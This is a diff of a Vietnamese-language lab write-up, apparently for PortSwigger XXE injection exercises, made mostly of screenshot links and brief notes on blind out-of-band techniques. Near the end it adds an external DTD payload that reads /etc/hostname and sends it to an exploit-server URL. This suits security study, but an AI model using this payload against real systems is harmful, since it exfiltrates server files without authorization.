@@ -1,4 +1,4 @@
-![image](https://github.com/user-attachments/assets/fec71b7a-2c45-415e-bc58-6dcd860f9253)
+![image](https://github.com/user-attachments/assets/9ac75822-f294-45ca-a3b0-8fa91d1c4b73)![image](https://github.com/user-attachments/assets/fec71b7a-2c45-415e-bc58-6dcd860f9253)
 
 Trong web có cái check stock dùng xml:
 
@@ -64,30 +64,53 @@ Và nó có gửi req tới, xong
 <h1>---------------------------------------------------------</h1>
 <br>
 
+![image](https://github.com/user-attachments/assets/369a2da2-7c6c-4b0c-87d6-fba9b3b676cd)
 
+Lần này thì bài không cho tôi dùng cái payload cũ nữa:
 
+![image](https://github.com/user-attachments/assets/29a4a0b4-de77-41f1-a90d-64e8a47adb16)
 
+Có cái này không cần phải gọi hẳn ra trong [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection):
 
+![image](https://github.com/user-attachments/assets/4d71462f-9c22-462d-98e4-0d5269a441f4)
 
+![image](https://github.com/user-attachments/assets/49e81264-d9cf-4dcc-9302-1e478b4e3ed9)
 
+Mặc dù nó nhìn ra lỗi nhưng bên collaborator vẫn có req được gửi tới:
 
+![image](https://github.com/user-attachments/assets/1b1454bd-61fa-4015-8bbd-9ca672a93bbe)
 
+<h1>---------------------------------------------------------</h1>
+<br>
 
+![image](https://github.com/user-attachments/assets/e4528b8e-ab5f-42bd-b40d-8917ba9ee1e0)
 
+Vẫn là cái req đấy:
 
+![image](https://github.com/user-attachments/assets/7abfc6fd-4193-48b7-bee4-7793b9ea7ad4)
 
+Vẫn là payload cũ và nó vẫn được:
 
+![image](https://github.com/user-attachments/assets/3cabee7b-743e-4618-aece-2a78da12c9b6)
 
+![image](https://github.com/user-attachments/assets/98f51724-33db-4bbe-ba5d-ff321fae1999)
 
+Ở đây tôi tạo 1 thực thể trỏ đến link của server exploit và chạy cái này:
 
+![image](https://github.com/user-attachments/assets/cd1899b1-00a4-424e-8e73-481be6147024)
 
+```
+<!ENTITY % hostnamefile SYSTEM "file:///etc/hostname">
+<!ENTITY % lmao1 "<!ENTITY &#x25; lmao2 SYSTEM 'https://exploit-0aec009d04696226814e60da01de004c.exploit-server.net/exploit/?x=%hostnamefile;'>">
+%lmao1;
+%lmao2;
+```
+Thì cái này sẽ mở file /etc/hostname và gán vào param exploit của link server exploit, giờ thì vào access log là có nội dung của file đấy:
 
+![image](https://github.com/user-attachments/assets/d8580921-f74a-4a2e-b01d-1b6dab2b7525)
 
-
-
-
-
-
+<h1>---------------------------------------------------------</h1>
+<br>
 
 
 
